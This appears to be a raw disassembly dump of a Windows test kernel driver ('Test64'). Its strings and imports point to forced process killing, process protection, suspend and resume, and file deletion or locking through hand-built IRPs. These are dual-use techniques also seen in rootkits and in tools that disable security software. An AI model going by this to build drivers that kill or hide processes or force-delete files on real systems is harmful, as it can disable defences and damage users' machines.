   1400024c6:	cc                   	int3
   1400024c7:	cc                   	int3
   1400024c8:	cc                   	int3
   1400024c9:	cc                   	int3
   1400024ca:	cc                   	int3
   1400024cb:	cc                   	int3
   1400024cc:	cc                   	int3
   1400024cd:	cc                   	int3
   1400024ce:	cc                   	int3
   1400024cf:	cc                   	int3
   1400024d0:	4f 62 43 72 65 61    	(bad)
   1400024d6:	74 65                	je     0x14000253d
   1400024d8:	4f 62 6a 65 63 74    	(bad)
   1400024de:	20 45 72             	and    %al,0x72(%rbp)
   1400024e1:	72 6f                	jb     0x140002552
   1400024e3:	72 5b                	jb     0x140002540
   1400024e5:	30 78 25             	xor    %bh,0x25(%rax)
   1400024e8:	58                   	pop    %rax
   1400024e9:	5d                   	pop    %rbp
   1400024ea:	0a 00                	or     (%rax),%al
   1400024ec:	cc                   	int3
   1400024ed:	cc                   	int3
   1400024ee:	cc                   	int3
   1400024ef:	cc                   	int3
   1400024f0:	70 46                	jo     0x140002538
   1400024f2:	69 6c 65 4f 62 6a 65 	imul   $0x63656a62,0x4f(%rbp,%riz,2),%ebp
   1400024f9:	63 
   1400024fa:	74 2d                	je     0x140002529
   1400024fc:	3e 46 69 6c 65 4e 61 	ds imul $0x3a656d61,0x4e(%rbp,%r12,2),%r13d
   140002503:	6d 65 3a 
   140002506:	25 77 5a 0a 00       	and    $0xa5a77,%eax
   14000250b:	cc                   	int3
   14000250c:	cc                   	int3
   14000250d:	cc                   	int3
   14000250e:	cc                   	int3
   14000250f:	cc                   	int3
   140002510:	53                   	push   %rbx
   140002511:	65 43 72 65          	gs rex.XB jb 0x14000257a
   140002515:	61                   	(bad)
   140002516:	74 65                	je     0x14000257d
   140002518:	41 63 63 65          	movsxd 0x65(%r11),%esp
   14000251c:	73 73                	jae    0x140002591
   14000251e:	53                   	push   %rbx
   14000251f:	74 61                	je     0x140002582
   140002521:	74 65                	je     0x140002588
   140002523:	20 45 72             	and    %al,0x72(%rbp)
   140002526:	72 6f                	jb     0x140002597
   140002528:	72 5b                	jb     0x140002585
   14000252a:	30 78 25             	xor    %bh,0x25(%rax)
   14000252d:	58                   	pop    %rax
   14000252e:	5d                   	pop    %rbp
   14000252f:	0a 00                	or     (%rax),%al
   140002531:	cc                   	int3
   140002532:	cc                   	int3
   140002533:	cc                   	int3
   140002534:	cc                   	int3
   140002535:	cc                   	int3
   140002536:	cc                   	int3
   140002537:	cc                   	int3
   140002538:	cc                   	int3
   140002539:	cc                   	int3
   14000253a:	cc                   	int3
   14000253b:	cc                   	int3
   14000253c:	cc                   	int3
   14000253d:	cc                   	int3
   14000253e:	cc                   	int3
   14000253f:	cc                   	int3
   140002540:	49 52                	rex.WB push %r10
   140002542:	50                   	push   %rax
   140002543:	20 46 41             	and    %al,0x41(%rsi)
   140002546:	49                   	rex.WB
   140002547:	4c                   	rex.WR
   140002548:	45                   	rex.RB
   140002549:	44 21 0a             	and    %r9d,(%rdx)
   14000254c:	00 cc                	add    %cl,%ah
   14000254e:	cc                   	int3
   14000254f:	cc                   	int3
   140002550:	5b                   	pop    %rbx
   140002551:	b4 f2                	mov    $0xf2,%ah
   140002553:	bf aa bd f8 b3       	mov    $0xb3f8bdaa,%edi
   140002558:	cc                   	int3
   140002559:	5d                   	pop    %rbp
   14000255a:	4f 70 65             	rex.WRXB jo 0x1400025c2
   14000255d:	6e                   	outsb  (%rsi),(%dx)
   14000255e:	50                   	push   %rax
   14000255f:	72 6f                	jb     0x1400025d0
   140002561:	63 65 73             	movsxd 0x73(%rbp),%esp
   140002564:	73 b3                	jae    0x140002519
   140002566:	c9                   	leave
   140002567:	b9 a6 2c bd f8       	mov    $0xf8bd2ca6,%ecx
   14000256c:	b3 cc                	mov    $0xcc,%bl
   14000256e:	49                   	rex.WB
   14000256f:	44 3a 20             	cmp    (%rax),%r12b
   140002572:	25 64 00 cc cc       	and    $0xcccc0064,%eax
   140002577:	cc                   	int3
   140002578:	cc                   	int3
   140002579:	cc                   	int3
   14000257a:	cc                   	int3
   14000257b:	cc                   	int3
   14000257c:	cc                   	int3
   14000257d:	cc                   	int3
   14000257e:	cc                   	int3
   14000257f:	cc                   	int3
   140002580:	5b                   	pop    %rbx
   140002581:	b4 f2                	mov    $0xf2,%ah
   140002583:	bf aa bd f8 b3       	mov    $0xb3f8bdaa,%edi
   140002588:	cc                   	int3
   140002589:	5d                   	pop    %rbp
   14000258a:	4f 70 65             	rex.WRXB jo 0x1400025f2
   14000258d:	6e                   	outsb  (%rsi),(%dx)
   14000258e:	50                   	push   %rax
   14000258f:	72 6f                	jb     0x140002600
   140002591:	63 65 73             	movsxd 0x73(%rbp),%esp
   140002594:	73 ca                	jae    0x140002560
   140002596:	a7                   	cmpsl  (%rdi),(%rsi)
   140002597:	b0 dc                	mov    $0xdc,%al
   140002599:	2c bd                	sub    $0xbd,%al
   14000259b:	f8                   	clc
   14000259c:	b3 cc                	mov    $0xcc,%bl
   14000259e:	49                   	rex.WB
   14000259f:	44 3a 20             	cmp    (%rax),%r12b
   1400025a2:	25 64 00 cc cc       	and    $0xcccc0064,%eax
   1400025a7:	cc                   	int3
   1400025a8:	cc                   	int3
   1400025a9:	cc                   	int3
   1400025aa:	cc                   	int3
   1400025ab:	cc                   	int3
   1400025ac:	cc                   	int3
   1400025ad:	cc                   	int3
   1400025ae:	cc                   	int3
   1400025af:	cc                   	int3
   1400025b0:	5b                   	pop    %rbx
   1400025b1:	bd e1 ca f8 bd       	mov    $0xbdf8cae1,%ebp
   1400025b6:	f8                   	clc
   1400025b7:	b3 cc                	mov    $0xcc,%bl
   1400025b9:	5d                   	pop    %rbp
   1400025ba:	4f 70 65             	rex.WRXB jo 0x140002622
   1400025bd:	6e                   	outsb  (%rsi),(%dx)
   1400025be:	50                   	push   %rax
   1400025bf:	72 6f                	jb     0x140002630
   1400025c1:	63 65 73             	movsxd 0x73(%rbp),%esp
   1400025c4:	73 b3                	jae    0x140002579
   1400025c6:	c9                   	leave
   1400025c7:	b9 a6 2c bd f8       	mov    $0xf8bd2ca6,%ecx
   1400025cc:	b3 cc                	mov    $0xcc,%bl
   1400025ce:	49                   	rex.WB
   1400025cf:	44 3a 20             	cmp    (%rax),%r12b
   1400025d2:	25 64 00 cc cc       	and    $0xcccc0064,%eax
   1400025d7:	cc                   	int3
   1400025d8:	cc                   	int3
   1400025d9:	cc                   	int3
   1400025da:	cc                   	int3
   1400025db:	cc                   	int3
   1400025dc:	cc                   	int3
   1400025dd:	cc                   	int3
   1400025de:	cc                   	int3
   1400025df:	cc                   	int3
   1400025e0:	5b                   	pop    %rbx
   1400025e1:	bd e1 ca f8 bd       	mov    $0xbdf8cae1,%ebp
   1400025e6:	f8                   	clc
   1400025e7:	b3 cc                	mov    $0xcc,%bl
   1400025e9:	5d                   	pop    %rbp
   1400025ea:	4f 70 65             	rex.WRXB jo 0x140002652
   1400025ed:	6e                   	outsb  (%rsi),(%dx)
   1400025ee:	50                   	push   %rax
   1400025ef:	72 6f                	jb     0x140002660
   1400025f1:	63 65 73             	movsxd 0x73(%rbp),%esp
   1400025f4:	73 ca                	jae    0x1400025c0
   1400025f6:	a7                   	cmpsl  (%rdi),(%rsi)
   1400025f7:	b0 dc                	mov    $0xdc,%al
   1400025f9:	2c bd                	sub    $0xbd,%al
   1400025fb:	f8                   	clc
   1400025fc:	b3 cc                	mov    $0xcc,%bl
   1400025fe:	49                   	rex.WB
   1400025ff:	44 3a 20             	cmp    (%rax),%r12b
   140002602:	25 64 00 cc cc       	and    $0xcccc0064,%eax
   140002607:	cc                   	int3
   140002608:	cc                   	int3
   140002609:	cc                   	int3
   14000260a:	cc                   	int3
   14000260b:	cc                   	int3
   14000260c:	cc                   	int3
   14000260d:	cc                   	int3
   14000260e:	cc                   	int3
   14000260f:	cc                   	int3
   140002610:	b9 d2 c6 f0 bd       	mov    $0xbdf0c6d2,%ecx
   140002615:	f8                   	clc
   140002616:	b3 cc                	mov    $0xcc,%bl
   140002618:	b3 c9                	mov    $0xc9,%bl
   14000261a:	b9 a6 0d 0a 00       	mov    $0xa0da6,%ecx
   14000261f:	cc                   	int3
   140002620:	bb d6 b8 b4 bd       	mov    $0xbdb4b8d6,%ebx
   140002625:	f8                   	clc
   140002626:	b3 cc                	mov    $0xcc,%bl
   140002628:	b3 c9                	mov    $0xc9,%bl
   14000262a:	b9 a6 0d 0a 00       	mov    $0xa0da6,%ecx
   14000262f:	cc                   	int3
   140002630:	cd a8                	int    $0xa8
   140002632:	d0 c5                	rol    $1,%ch
   140002634:	b5 c4                	mov    $0xc4,%ch
   140002636:	ce                   	(bad)
   140002637:	c4                   	(bad)
   140002638:	b1 be                	mov    $0xbe,%cl
   14000263a:	3a 25 77 5a 0a 00    	cmp    0xa5a77(%rip),%ah        # 0x1400a80b7
   140002640:	4e 75 6d             	rex.WRX jne 0x1400026b0
   140002643:	62 65 72 20 20       	(bad)
   140002648:	3a 20                	cmp    (%rax),%ah
   14000264a:	20 20                	and    %ah,(%rax)
   14000264c:	25 64 0a 00 6b       	and    $0x6b000a64,%eax
   140002651:	69 6c 6c 20 70 69 64 	imul   $0x20646970,0x20(%rsp,%rbp,2),%ebp
   140002658:	20 
   140002659:	20 3a                	and    %bh,(%rdx)
   14000265b:	20 20                	and    %ah,(%rax)
   14000265d:	20 25 64 0a 00 cc    	and    %ah,-0x33fff59c(%rip)        # 0x10c0030c7
   140002663:	cc                   	int3
   140002664:	cc                   	int3
   140002665:	cc                   	int3
   140002666:	cc                   	int3
   140002667:	cc                   	int3
   140002668:	cc                   	int3
   140002669:	cc                   	int3
   14000266a:	cc                   	int3
   14000266b:	cc                   	int3
   14000266c:	cc                   	int3
   14000266d:	cc                   	int3
   14000266e:	cc                   	int3
   14000266f:	cc                   	int3
   140002670:	70 72                	jo     0x1400026e4
   140002672:	6f                   	outsl  (%rsi),(%dx)
   140002673:	74 65                	je     0x1400026da
   140002675:	63 74 20 20          	movsxd 0x20(%rax,%riz,1),%esi
   140002679:	70 69                	jo     0x1400026e4
   14000267b:	64 3a 20             	cmp    %fs:(%rax),%ah
   14000267e:	20 20                	and    %ah,(%rax)
   140002680:	25 64 0a 00 cc       	and    $0xcc000a64,%eax
   140002685:	cc                   	int3
   140002686:	cc                   	int3
   140002687:	cc                   	int3
   140002688:	cc                   	int3
   140002689:	cc                   	int3
   14000268a:	cc                   	int3
   14000268b:	cc                   	int3
   14000268c:	cc                   	int3
   14000268d:	cc                   	int3
   14000268e:	cc                   	int3
   14000268f:	cc                   	int3
   140002690:	6f                   	outsl  (%rsi),(%dx)
   140002691:	70 65                	jo     0x1400026f8
   140002693:	6e                   	outsb  (%rsi),(%dx)
   140002694:	20 20                	and    %ah,(%rax)
   140002696:	70 69                	jo     0x140002701
   140002698:	64 3a 20             	cmp    %fs:(%rax),%ah
   14000269b:	20 20                	and    %ah,(%rax)
   14000269d:	25 64 0a 00 cc       	and    $0xcc000a64,%eax
   1400026a2:	cc                   	int3
   1400026a3:	cc                   	int3
   1400026a4:	cc                   	int3
   1400026a5:	cc                   	int3
   1400026a6:	cc                   	int3
   1400026a7:	cc                   	int3
   1400026a8:	cc                   	int3
   1400026a9:	cc                   	int3
   1400026aa:	cc                   	int3
   1400026ab:	cc                   	int3
   1400026ac:	cc                   	int3
   1400026ad:	cc                   	int3
   1400026ae:	cc                   	int3
   1400026af:	cc                   	int3
   1400026b0:	44                   	rex.R
   1400026b1:	65 6c                	gs insb (%dx),(%rdi)
   1400026b3:	65 74 65             	gs je  0x14000271b
   1400026b6:	46 69 6c 65 50 61 74 	imul   $0x3a687461,0x50(%rbp,%r12,2),%r13d
   1400026bd:	68 3a 
   1400026bf:	25 77 5a 0a 00       	and    $0xa5a77,%eax
   1400026c4:	cc                   	int3
   1400026c5:	cc                   	int3
   1400026c6:	cc                   	int3
   1400026c7:	cc                   	int3
   1400026c8:	cc                   	int3
   1400026c9:	cc                   	int3
   1400026ca:	cc                   	int3
   1400026cb:	cc                   	int3
   1400026cc:	cc                   	int3
   1400026cd:	cc                   	int3
   1400026ce:	cc                   	int3
   1400026cf:	cc                   	int3
   1400026d0:	4c 6f                	rex.WR outsl (%rsi),(%dx)
   1400026d2:	63 6b 46             	movsxd 0x46(%rbx),%ebp
   1400026d5:	69 6c 65 50 61 74 68 	imul   $0x3a687461,0x50(%rbp,%riz,2),%ebp
   1400026dc:	3a 
   1400026dd:	25 77 5a 0a 00       	and    $0xa5a77,%eax
   1400026e2:	cc                   	int3
   1400026e3:	cc                   	int3
   1400026e4:	cc                   	int3
   1400026e5:	cc                   	int3
   1400026e6:	cc                   	int3
   1400026e7:	cc                   	int3
   1400026e8:	cc                   	int3
   1400026e9:	cc                   	int3
   1400026ea:	cc                   	int3
   1400026eb:	cc                   	int3
   1400026ec:	cc                   	int3
   1400026ed:	cc                   	int3
   1400026ee:	cc                   	int3
   1400026ef:	cc                   	int3
   1400026f0:	50                   	push   %rax
   1400026f1:	61                   	(bad)
   1400026f2:	75 73                	jne    0x140002767
   1400026f4:	65 20 20             	and    %ah,%gs:(%rax)
   1400026f7:	70 69                	jo     0x140002762
   1400026f9:	64 3a 20             	cmp    %fs:(%rax),%ah
   1400026fc:	20 20                	and    %ah,(%rax)
   1400026fe:	25 64 0a 00 cc       	and    $0xcc000a64,%eax
   140002703:	cc                   	int3
   140002704:	cc                   	int3
   140002705:	cc                   	int3
   140002706:	cc                   	int3
   140002707:	cc                   	int3
   140002708:	cc                   	int3
   140002709:	cc                   	int3
   14000270a:	cc                   	int3
   14000270b:	cc                   	int3
   14000270c:	cc                   	int3
   14000270d:	cc                   	int3
   14000270e:	cc                   	int3
   14000270f:	cc                   	int3
   140002710:	52                   	push   %rdx
   140002711:	65 73 75             	gs jae 0x140002789
   140002714:	6d                   	insl   (%dx),(%rdi)
   140002715:	65 20 20             	and    %ah,%gs:(%rax)
   140002718:	70 69                	jo     0x140002783
   14000271a:	64 3a 20             	cmp    %fs:(%rax),%ah
   14000271d:	20 20                	and    %ah,(%rax)
   14000271f:	25 64 0a 00 cc       	and    $0xcc000a64,%eax
   140002724:	cc                   	int3
   140002725:	cc                   	int3
   140002726:	cc                   	int3
   140002727:	cc                   	int3
   140002728:	cc                   	int3
   140002729:	cc                   	int3
   14000272a:	cc                   	int3
   14000272b:	cc                   	int3
   14000272c:	cc                   	int3
   14000272d:	cc                   	int3
   14000272e:	cc                   	int3
   14000272f:	cc                   	int3
   140002730:	ce                   	(bad)
   140002731:	b4 b6                	mov    $0xb6,%ah
   140002733:	a8 d2                	test   $0xd2,%al
   140002735:	e5 b5                	in     $0xb5,%eax
   140002737:	c4                   	(bad)
   140002738:	bf d8 d6 c6 c2       	mov    $0xc2c6d6d8,%edi
   14000273d:	eb 20                	jmp    0x14000275f
   14000273f:	3a 20                	cmp    (%rax),%ah
   140002741:	25 64 00 cc cc       	and    $0xcccc0064,%eax
   140002746:	cc                   	int3
   140002747:	cc                   	int3
   140002748:	cc                   	int3
   140002749:	cc                   	int3
   14000274a:	cc                   	int3
   14000274b:	cc                   	int3
   14000274c:	cc                   	int3
   14000274d:	cc                   	int3
   14000274e:	cc                   	int3
   14000274f:	cc                   	int3
   140002750:	5c                   	pop    %rsp
   140002751:	00 44 00 6f          	add    %al,0x6f(%rax,%rax,1)
   140002755:	00 73 00             	add    %dh,0x0(%rbx)
   140002758:	44 00 65 00          	add    %r12b,0x0(%rbp)
   14000275c:	76 00                	jbe    0x14000275e
   14000275e:	69 00 63 00 65 00    	imul   $0x650063,(%rax),%eax
   140002764:	73 00                	jae    0x140002766
   140002766:	5c                   	pop    %rsp
   140002767:	00 54 00 65          	add    %dl,0x65(%rax,%rax,1)
   14000276b:	00 73 00             	add    %dh,0x0(%rbx)
   14000276e:	74 00                	je     0x140002770
   140002770:	36 00 34 00          	ss add %dh,(%rax,%rax,1)
   140002774:	00 00                	add    %al,(%rax)
   140002776:	cc                   	int3
   140002777:	cc                   	int3
   140002778:	cc                   	int3
   140002779:	cc                   	int3
   14000277a:	cc                   	int3
   14000277b:	cc                   	int3
   14000277c:	cc                   	int3
   14000277d:	cc                   	int3
   14000277e:	cc                   	int3
   14000277f:	cc                   	int3
   140002780:	54                   	push   %rsp
   140002781:	65 73 74             	gs jae 0x1400027f8
   140002784:	44 72 69             	rex.R jb 0x1400027f0
   140002787:	76 65                	jbe    0x1400027ee
   140002789:	72 20                	jb     0x1400027ab
   14000278b:	c7                   	(bad)
   14000278c:	fd                   	std
   14000278d:	b6 af                	mov    $0xaf,%dh
   14000278f:	d0 b6 d4 d8 0a 00    	shlb   $1,0xad8d4(%rsi)
   140002795:	cc                   	int3
   140002796:	cc                   	int3
   140002797:	cc                   	int3
   140002798:	cc                   	int3
   140002799:	cc                   	int3
   14000279a:	cc                   	int3
   14000279b:	cc                   	int3
   14000279c:	cc                   	int3
   14000279d:	cc                   	int3
   14000279e:	cc                   	int3
   14000279f:	cc                   	int3
   1400027a0:	33 00                	xor    (%rax),%eax
   1400027a2:	32 00                	xor    (%rax),%al
   1400027a4:	31 00                	xor    %eax,(%rax)
   1400027a6:	30 00                	xor    %al,(%rax)
   1400027a8:	30 00                	xor    %al,(%rax)
   1400027aa:	30 00                	xor    %al,(%rax)
   1400027ac:	00 00                	add    %al,(%rax)
   1400027ae:	cc                   	int3
   1400027af:	cc                   	int3
   1400027b0:	5c                   	pop    %rsp
   1400027b1:	00 44 00 65          	add    %al,0x65(%rax,%rax,1)
   1400027b5:	00 76 00             	add    %dh,0x0(%rsi)
   1400027b8:	69 00 63 00 65 00    	imul   $0x650063,(%rax),%eax
   1400027be:	5c                   	pop    %rsp
   1400027bf:	00 54 00 65          	add    %dl,0x65(%rax,%rax,1)
   1400027c3:	00 73 00             	add    %dh,0x0(%rbx)
   1400027c6:	74 00                	je     0x1400027c8
   1400027c8:	36 00 34 00          	ss add %dh,(%rax,%rax,1)
	...

Disassembly of section INIT:

0000000140006000 <INIT>:
   140006000:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006005:	57                   	push   %rdi
   140006006:	48 83 ec 20          	sub    $0x20,%rsp
   14000600a:	48 8b da             	mov    %rdx,%rbx
   14000600d:	48 8b f9             	mov    %rcx,%rdi
   140006010:	e8 17 00 00 00       	call   0x14000602c
   140006015:	48 8b d3             	mov    %rbx,%rdx
   140006018:	48 8b cf             	mov    %rdi,%rcx
   14000601b:	e8 58 b9 ff ff       	call   0x140001978
   140006020:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006025:	48 83 c4 20          	add    $0x20,%rsp
   140006029:	5f                   	pop    %rdi
   14000602a:	c3                   	ret
   14000602b:	cc                   	int3
   14000602c:	48 8b 05 cd df ff ff 	mov    -0x2033(%rip),%rax        # 0x140004000
   140006033:	45 33 c9             	xor    %r9d,%r9d
   140006036:	49 b8 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%r8
   14000603d:	2b 00 00 
   140006040:	48 85 c0             	test   %rax,%rax
   140006043:	74 05                	je     0x14000604a
   140006045:	49 3b c0             	cmp    %r8,%rax
   140006048:	75 38                	jne    0x140006082
   14000604a:	0f 31                	rdtsc
   14000604c:	48 c1 e2 20          	shl    $0x20,%rdx
   140006050:	48 8d 0d a9 df ff ff 	lea    -0x2057(%rip),%rcx        # 0x140004000
   140006057:	48 0b c2             	or     %rdx,%rax
   14000605a:	48 33 c1             	xor    %rcx,%rax
   14000605d:	48 89 05 9c df ff ff 	mov    %rax,-0x2064(%rip)        # 0x140004000
   140006064:	66 44 89 0d 9a df ff 	mov    %r9w,-0x2066(%rip)        # 0x140004006
   14000606b:	ff 
   14000606c:	48 8b 05 8d df ff ff 	mov    -0x2073(%rip),%rax        # 0x140004000
   140006073:	48 85 c0             	test   %rax,%rax
   140006076:	75 0a                	jne    0x140006082
   140006078:	49 8b c0             	mov    %r8,%rax
   14000607b:	48 89 05 7e df ff ff 	mov    %rax,-0x2082(%rip)        # 0x140004000
   140006082:	48 f7 d0             	not    %rax
   140006085:	48 89 05 7c df ff ff 	mov    %rax,-0x2084(%rip)        # 0x140004008
   14000608c:	c3                   	ret
   14000608d:	cc                   	int3
   14000608e:	cc                   	int3
   14000608f:	cc                   	int3
   140006090:	b8 60 00 00 00       	mov    $0x60,%eax
   140006095:	00 00                	add    %al,(%rax)
   140006097:	00 00                	add    %al,(%rax)
   140006099:	00 00                	add    %al,(%rax)
   14000609b:	00 4e 64             	add    %cl,0x64(%rsi)
   14000609e:	00 00                	add    %al,(%rax)
   1400060a0:	00 30                	add    %dh,(%rax)
	...
   1400060b6:	00 00                	add    %al,(%rax)
   1400060b8:	c8 61 00 00          	enter  $0x61,$0x0
   1400060bc:	00 00                	add    %al,(%rax)
   1400060be:	00 00                	add    %al,(%rax)
   1400060c0:	d4                   	(bad)
   1400060c1:	61                   	(bad)
   1400060c2:	00 00                	add    %al,(%rax)
   1400060c4:	00 00                	add    %al,(%rax)
   1400060c6:	00 00                	add    %al,(%rax)
   1400060c8:	ec                   	in     (%dx),%al
   1400060c9:	61                   	(bad)
   1400060ca:	00 00                	add    %al,(%rax)
   1400060cc:	00 00                	add    %al,(%rax)
   1400060ce:	00 00                	add    %al,(%rax)
   1400060d0:	04 62                	add    $0x62,%al
   1400060d2:	00 00                	add    %al,(%rax)
   1400060d4:	00 00                	add    %al,(%rax)
   1400060d6:	00 00                	add    %al,(%rax)
   1400060d8:	18 62 00             	sbb    %ah,0x0(%rdx)
   1400060db:	00 00                	add    %al,(%rax)
   1400060dd:	00 00                	add    %al,(%rax)
   1400060df:	00 26                	add    %ah,(%rsi)
   1400060e1:	62                   	(bad)
   1400060e2:	00 00                	add    %al,(%rax)
   1400060e4:	00 00                	add    %al,(%rax)
   1400060e6:	00 00                	add    %al,(%rax)
   1400060e8:	3e 62                	ds (bad)
   1400060ea:	00 00                	add    %al,(%rax)
   1400060ec:	00 00                	add    %al,(%rax)
   1400060ee:	00 00                	add    %al,(%rax)
   1400060f0:	50                   	push   %rax
   1400060f1:	62                   	(bad)
   1400060f2:	00 00                	add    %al,(%rax)
   1400060f4:	00 00                	add    %al,(%rax)
   1400060f6:	00 00                	add    %al,(%rax)
   1400060f8:	60                   	(bad)
   1400060f9:	62                   	(bad)
   1400060fa:	00 00                	add    %al,(%rax)
   1400060fc:	00 00                	add    %al,(%rax)
   1400060fe:	00 00                	add    %al,(%rax)
   140006100:	70 62                	jo     0x140006164
   140006102:	00 00                	add    %al,(%rax)
   140006104:	00 00                	add    %al,(%rax)
   140006106:	00 00                	add    %al,(%rax)
   140006108:	80 62 00 00          	andb   $0x0,0x0(%rdx)
   14000610c:	00 00                	add    %al,(%rax)
   14000610e:	00 00                	add    %al,(%rax)
   140006110:	8c 62 00             	mov    %fs,0x0(%rdx)
   140006113:	00 00                	add    %al,(%rax)
   140006115:	00 00                	add    %al,(%rax)
   140006117:	00 98 62 00 00 00    	add    %bl,0x62(%rax)
   14000611d:	00 00                	add    %al,(%rax)
   14000611f:	00 b4 62 00 00 00 00 	add    %dh,0x0(%rdx,%riz,2)
   140006126:	00 00                	add    %al,(%rax)
   140006128:	be 62 00 00 00       	mov    $0x62,%esi
   14000612d:	00 00                	add    %al,(%rax)
   14000612f:	00 de                	add    %bl,%dh
   140006131:	62                   	(bad)
   140006132:	00 00                	add    %al,(%rax)
   140006134:	00 00                	add    %al,(%rax)
   140006136:	00 00                	add    %al,(%rax)
   140006138:	f4                   	hlt
   140006139:	62                   	(bad)
   14000613a:	00 00                	add    %al,(%rax)
   14000613c:	00 00                	add    %al,(%rax)
   14000613e:	00 00                	add    %al,(%rax)
   140006140:	06                   	(bad)
   140006141:	63 00                	movsxd (%rax),%eax
   140006143:	00 00                	add    %al,(%rax)
   140006145:	00 00                	add    %al,(%rax)
   140006147:	00 1a                	add    %bl,(%rdx)
   140006149:	63 00                	movsxd (%rax),%eax
   14000614b:	00 00                	add    %al,(%rax)
   14000614d:	00 00                	add    %al,(%rax)
   14000614f:	00 30                	add    %dh,(%rax)
   140006151:	63 00                	movsxd (%rax),%eax
   140006153:	00 00                	add    %al,(%rax)
   140006155:	00 00                	add    %al,(%rax)
   140006157:	00 42 63             	add    %al,0x63(%rdx)
   14000615a:	00 00                	add    %al,(%rax)
   14000615c:	00 00                	add    %al,(%rax)
   14000615e:	00 00                	add    %al,(%rax)
   140006160:	5a                   	pop    %rdx
   140006161:	63 00                	movsxd (%rax),%eax
   140006163:	00 00                	add    %al,(%rax)
   140006165:	00 00                	add    %al,(%rax)
   140006167:	00 6c 63 00          	add    %ch,0x0(%rbx,%riz,2)
   14000616b:	00 00                	add    %al,(%rax)
   14000616d:	00 00                	add    %al,(%rax)
   14000616f:	00 84 63 00 00 00 00 	add    %al,0x0(%rbx,%riz,2)
   140006176:	00 00                	add    %al,(%rax)
   140006178:	9a                   	(bad)
   140006179:	63 00                	movsxd (%rax),%eax
   14000617b:	00 00                	add    %al,(%rax)
   14000617d:	00 00                	add    %al,(%rax)
   14000617f:	00 b2 63 00 00 00    	add    %dh,0x63(%rdx)
   140006185:	00 00                	add    %al,(%rax)
   140006187:	00 c4                	add    %al,%ah
   140006189:	63 00                	movsxd (%rax),%eax
   14000618b:	00 00                	add    %al,(%rax)
   14000618d:	00 00                	add    %al,(%rax)
   14000618f:	00 da                	add    %bl,%dl
   140006191:	63 00                	movsxd (%rax),%eax
   140006193:	00 00                	add    %al,(%rax)
   140006195:	00 00                	add    %al,(%rax)
   140006197:	00 ea                	add    %ch,%dl
   140006199:	63 00                	movsxd (%rax),%eax
   14000619b:	00 00                	add    %al,(%rax)
   14000619d:	00 00                	add    %al,(%rax)
   14000619f:	00 08                	add    %cl,(%rax)
   1400061a1:	64 00 00             	add    %al,%fs:(%rax)
   1400061a4:	00 00                	add    %al,(%rax)
   1400061a6:	00 00                	add    %al,(%rax)
   1400061a8:	1c 64                	sbb    $0x64,%al
   1400061aa:	00 00                	add    %al,(%rax)
   1400061ac:	00 00                	add    %al,(%rax)
   1400061ae:	00 00                	add    %al,(%rax)
   1400061b0:	2e 64 00 00          	cs add %al,%fs:(%rax)
   1400061b4:	00 00                	add    %al,(%rax)
   1400061b6:	00 00                	add    %al,(%rax)
   1400061b8:	3e 64 00 00          	ds add %al,%fs:(%rax)
	...
   1400061c8:	5d                   	pop    %rbp
   1400061c9:	00 44 62 67          	add    %al,0x67(%rdx,%riz,2)
   1400061cd:	50                   	push   %rax
   1400061ce:	72 69                	jb     0x140006239
   1400061d0:	6e                   	outsb  (%rsi),(%dx)
   1400061d1:	74 00                	je     0x1400061d3
   1400061d3:	00 73 06             	add    %dh,0x6(%rbx)
   1400061d6:	4f 62 66 44 65 72    	(bad)
   1400061dc:	65 66 65 72 65       	gs data16 gs jb 0x140006246
   1400061e1:	6e                   	outsb  (%rsi),(%dx)
   1400061e2:	63 65 4f             	movsxd 0x4f(%rbp),%esp
   1400061e5:	62 6a 65 63 74       	(bad)
   1400061ea:	00 00                	add    %al,(%rax)
   1400061ec:	7f 08                	jg     0x1400061f6
   1400061ee:	52                   	push   %rdx
   1400061ef:	74 6c                	je     0x14000625d
   1400061f1:	49 6e                	rex.WB outsb (%rsi),(%dx)
   1400061f3:	69 74 55 6e 69 63 6f 	imul   $0x646f6369,0x6e(%rbp,%rdx,2),%esi
   1400061fa:	64 
   1400061fb:	65 53                	gs push %rbx
   1400061fd:	74 72                	je     0x140006271
   1400061ff:	69 6e 67 00 00 83 04 	imul   $0x4830000,0x67(%rsi),%ebp
   140006206:	4b                   	rex.WXB
   140006207:	65 49 6e             	rex.WB outsb %gs:(%rsi),(%dx)
   14000620a:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%rcx,%rbp,2),%esi
   140006211:	65 
   140006212:	45 76 65             	rex.RB jbe 0x14000627a
   140006215:	6e                   	outsb  (%rsi),(%dx)
   140006216:	74 00                	je     0x140006218
   140006218:	05 05 4b 65 53       	add    $0x53654b05,%eax
   14000621d:	65 74 45             	gs je  0x140006265
   140006220:	76 65                	jbe    0x140006287
   140006222:	6e                   	outsb  (%rsi),(%dx)
   140006223:	74 00                	je     0x140006225
   140006225:	00 30                	add    %dh,(%rax)
   140006227:	05 4b 65 57 61       	add    $0x6157654b,%eax
   14000622c:	69 74 46 6f 72 53 69 	imul   $0x6e695372,0x6f(%rsi,%rax,2),%esi
   140006233:	6e 
   140006234:	67 6c                	insb   (%dx),(%edi)
   140006236:	65 4f 62 6a 65 63 74 	(bad)
   14000623d:	00 9e 00 45 78 41    	add    %bl,0x41784500(%rsi)
   140006243:	6c                   	insb   (%dx),(%rdi)
   140006244:	6c                   	insb   (%dx),(%rdi)
   140006245:	6f                   	outsl  (%rsi),(%dx)
   140006246:	63 61 74             	movsxd 0x74(%rcx),%esp
   140006249:	65 50                	gs push %rax
   14000624b:	6f                   	outsl  (%rsi),(%dx)
   14000624c:	6f                   	outsl  (%rsi),(%dx)
   14000624d:	6c                   	insb   (%dx),(%rdi)
   14000624e:	00 00                	add    %al,(%rax)
   140006250:	c2 02 49             	ret    $0x4902
   140006253:	6f                   	outsl  (%rsi),(%dx)
   140006254:	41 6c                	rex.B insb (%dx),(%rdi)
   140006256:	6c                   	insb   (%dx),(%rdi)
   140006257:	6f                   	outsl  (%rsi),(%dx)
   140006258:	63 61 74             	movsxd 0x74(%rcx),%esp
   14000625b:	65 49 72 70          	gs rex.WB jb 0x1400062cf
   14000625f:	00 0d 04 49 6f 66    	add    %cl,0x666f4904(%rip)        # 0x1a66fab69
   140006265:	43 61                	rex.XB (bad)
   140006267:	6c                   	insb   (%dx),(%rdi)
   140006268:	6c                   	insb   (%dx),(%rdi)
   140006269:	44 72 69             	rex.R jb 0x1400062d5
   14000626c:	76 65                	jbe    0x1400062d3
